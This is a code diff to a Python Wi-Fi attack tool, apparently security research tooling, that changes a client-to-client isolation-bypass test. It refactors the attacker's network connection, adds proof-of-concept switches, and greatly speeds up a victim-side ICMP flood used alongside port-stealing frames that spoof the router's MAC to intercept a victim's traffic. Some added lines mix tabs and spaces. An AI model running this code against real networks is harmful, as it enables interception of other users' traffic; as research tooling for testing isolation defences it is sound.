@@ -761,7 +761,7 @@ class Client2Client:
 		self.forward_ethernet = False
 		self.bssid_victim = None
 		self.bssid_attacker = None
-		
+		self.attacker_connected = False
 
 	def stop(self):
 		if not self.poc:
@@ -773,7 +773,7 @@ class Client2Client:
 		if self.options.same_id:
 			identities = f"{self.sup_victim.id_victim} to {self.sup_victim.id_victim}"
 		else:
-			identities = f"{self.sup_attacker.id_attacker} to {self.sup_victim.id_victim}"
+			identities = f"{self.sup_victim.id_attacker} to {self.sup_victim.id_victim}"
 
 		if b"forward_ip" in raw(eth):
 			self.forward_ip = True
@@ -840,8 +840,9 @@ class Client2Client:
 			p = Ether(src=self.sup_attacker.mac, dst=self.sup_attacker.mac, type=0x0800)/Raw(b"port_steal")
 			log(STATUS, f"Sending port stealing frames from attacker to attacker's addr:       {repr(p)} (Ethernet destination is the attacker's addr)")
 			for _ in range(1000000):
-				self.sup_attacker.send_eth(p)
-				log(STATUS, f"Sent one port stealing frame from attacker:       {repr(p)}")
+				if self.attacker_connected:
+					self.sup_attacker.send_eth(p)
+					log(STATUS, f"Sent one port stealing frame from attacker:       {repr(p)}")
 				time.sleep(0.05)
 			log(STATUS, f"Finished sending 1000000 frames.")
 
@@ -910,12 +911,13 @@ class Client2Client:
 	
 	def send_uplink_frame(self):
 		if self.options.c2c_port_steal is not None:
-			for _ in range(500):
+			for _ in range(500000):
 				ip = IP(src=self.sup_victim.clientip, dst="8.8.8.8")/ICMP(id=random.randint(0, 0xFFFF), seq=random.randint(0, 0xFFFF))
 				p = Ether(src=self.sup_victim.mac, dst=self.sup_victim.routermac)/ip/Raw(b"1234567890")
 				log(STATUS, f"Sending ICMP echo packet from victim to 8.8.8.8:       {repr(p)}")
 				self.sup_victim.send_eth(p)
-				time.sleep(0.5)
+				time.sleep(0.001)
+				# self.sup_victim.send_tcp_syn()
 
 	def send_uplink_frame2(self):
 		if self.options.c2c_port_steal_uplink is not None:
@@ -965,50 +967,15 @@ class Client2Client:
 		if self.options.c2c_port_steal_uplink is not None:
 			set_macaddress(self.options.c2c, self.sup_victim.routermac)
 			self.sup_attacker = Supplicant(self.options.c2c, self.options)
-
-		self.sup_attacker.start()
-		self.sup_attacker.scan(wait=False)
-		self.sup_attacker.wait_scan_done()
-
-		# If --other-bss is connect, connect to a different BSSID. Otherwise connect to the same BSSID.
-		if self.options.other_bss:
-			log(STATUS, f"Will now connect to a BSSID different than {self.bssid_victim}")
-			self.sup_attacker.ignore_bssid(self.bssid_victim)
-		else:
-			log(STATUS, f"Will now connect to the BSSID {self.bssid_victim}")
-			self.sup_attacker.set_bssid(self.bssid_victim)
-
-		if self.options.same_id:
-			log(STATUS, f"Connecting as {self.sup_attacker.id_victim} using {self.sup_attacker.nic_iface} to the network...", color="green")
-			self.sup_attacker.connect(self.sup_attacker.netid_victim, timeout=60)
-		else:
-			log(STATUS, f"Connecting as {self.sup_attacker.id_attacker} using {self.sup_attacker.nic_iface} to the network...", color="green")
-			self.sup_attacker.connect(self.sup_attacker.netid_attacker, timeout=60)
-
-		data = self.sup_attacker.status()
-		self.bssid_attacker = data['bssid']
-		
-		# Let the attacker get an IP address, also
-		if self.options.c2c_port_steal_uplink is None and self.options.c2c_port_steal is None:
-			self.sup_attacker.get_ip_address()
-		elif self.options.c2c_port_steal is not None:
-			self.sup_attacker.arp_sock = ARP_sock(sock=self.sup_attacker.sock_eth, IP_addr=self.sup_victim.clientip, ARP_addr=self.sup_attacker.mac)
-			self.sup_attacker.can_send_traffic = True
-
-
-		if self.options.check_gtk_shared is not None:
-			victim_gtk = self.sup_victim.get_gtk()
-			attacker_gtk = self.sup_attacker.get_gtk()
-			log(STATUS, f">>> The victim's GTK is ({victim_gtk}).", color="green")
-			log(STATUS, f">>> The attacker's GTK is ({attacker_gtk}).", color="green")
-			return
-		
+		if self.options.c2c_port_steal is None:
+			self.attacker_connect()
+		self.check_gtk_shared()
 
 		# [ Send a packet from the attacker to the victim ]
 
 		thread1 = threading.Thread(target=self.send_c2c_frame)
-		
-		thread2 = threading.Thread(target=self.start_monitor)
+		if not self.options.poc:
+			thread2 = threading.Thread(target=self.start_monitor)
 
 		if self.options.c2c_port_steal is not None:
 			thread4 = threading.Thread(target=self.start_attacker_receiver)
@@ -1022,15 +989,21 @@ class Client2Client:
 			elif self.options.c2c_port_steal_uplink is not None:
 				thread3 = threading.Thread(target=self.send_uplink_frame2)
 				
-
-		thread2.start()
+		if not self.options.poc:
+			thread2.start()
 		thread1.start()
-		thread4.start()
-		thread3.start()
+		if self.options.c2c_port_steal is not None or self.options.c2c_port_steal_uplink is not None:
+			if self.options.c2c_port_steal is not None:
+                        	self.attacker_connect()
+			thread4.start()
+		if not self.options.poc:
+			if self.options.c2c_port_steal is not None or self.options.c2c_port_steal_uplink is not None:
+				thread3.start()
 
 
 		thread1.join()
-		thread2.join()
+		if not self.options.poc:
+			thread2.join()
 		thread4.join()
 		if not self.options.poc:
 			if self.options.c2c_port_steal is not None or self.options.c2c_port_steal_uplink is not None:
@@ -1056,7 +1029,45 @@ class Client2Client:
 		elif not self.forward_ip and self.options.c2c_ip is not None:
 			log(STATUS, f">>> Client to client traffic at IP layer appears to be disabled ({identities}).", color="green")
 
-		
+	def attacker_connect(self):
+                self.sup_attacker.start()
+                self.sup_attacker.scan(wait=False)
+                self.sup_attacker.wait_scan_done()
+
+                # If --other-bss is connect, connect to a different BSSID. Otherwise connect to the same BSSID.
+                #if self.options.other_bss:
+                #        log(STATUS, f"Will now connect to a BSSID different than {self.bssid_victim}")
+                #        self.sup_attacker.ignore_bssid(self.bssid_victim)
+                #else:
+                #        log(STATUS, f"Will now connect to the BSSID {self.bssid_victim}")
+                #        self.sup_attacker.set_bssid(self.bssid_victim)
+
+                if self.options.same_id:
+                        log(STATUS, f"Connecting as {self.sup_attacker.id_victim} using {self.sup_attacker.nic_iface} to the network...", color="green")
+                        self.sup_attacker.connect(self.sup_attacker.netid_victim, timeout=60)
+                else:
+                        log(STATUS, f"Connecting as {self.sup_attacker.id_attacker} using {self.sup_attacker.nic_iface} to the network...", color="green")
+                        self.sup_attacker.connect(self.sup_attacker.netid_attacker, timeout=60)
+
+                data = self.sup_attacker.status()
+                self.bssid_attacker = data['bssid']
+                
+                # Let the attacker get an IP address, also
+                if self.options.c2c_port_steal_uplink is None and self.options.c2c_port_steal is None:
+                        self.sup_attacker.get_ip_address()
+                elif self.options.c2c_port_steal is not None and not self.options.poc:
+                        self.sup_attacker.arp_sock = ARP_sock(sock=self.sup_attacker.sock_eth, IP_addr=self.sup_victim.clientip, ARP_addr=self.sup_attacker.mac)
+                        self.sup_attacker.can_send_traffic = True
+                self.attacker_connected = True
+
+	def check_gtk_shared(self):
+                if self.options.check_gtk_shared is not None:
+                        victim_gtk = self.sup_victim.get_gtk()
+                        attacker_gtk = self.sup_attacker.get_gtk()
+                        log(STATUS, f">>> The victim's GTK is ({victim_gtk}).", color="green")
+                        log(STATUS, f">>> The attacker's GTK is ({attacker_gtk}).", color="green")
+                        return
+
 
 class Client2Monitor:
 	def __init__(self, options):
@@ -1199,4 +1210,6 @@ def main():
 
 if __name__ == "__main__":
 	main()
+
+
 
